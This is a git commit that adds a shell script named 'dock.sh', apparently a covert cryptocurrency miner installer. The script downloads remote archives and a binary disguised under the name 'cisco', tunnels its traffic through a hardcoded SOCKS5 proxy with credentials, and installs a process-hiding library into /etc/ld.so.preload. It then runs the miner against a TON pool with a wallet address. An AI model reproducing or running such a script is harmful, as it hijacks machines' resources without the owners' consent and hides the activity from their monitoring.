1690a81e2804ed0f312b7fdc35ef12d91666fc6e
ploretope <102384014+ploretope@users.noreply.github.com>
2022-05-29 14:56:59 +0700

    Create dock.sh

---
+++ dock.sh
@@ -0,0 +1,55 @@
+#!/bin/sh
+
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+
+
+
+
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://www.dropbox.com/s/4dgaygg0lmxgd4z/cisco?raw=1
+chmod +x cisco?raw=1
+ph add cisco?raw=1
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp ./cisco?raw=1 run https://next.ton-pool.club EQAOV41G7d93Ug0B6PRjp4RHZ7ID_ivK74nCJiX-X8WtCvwD
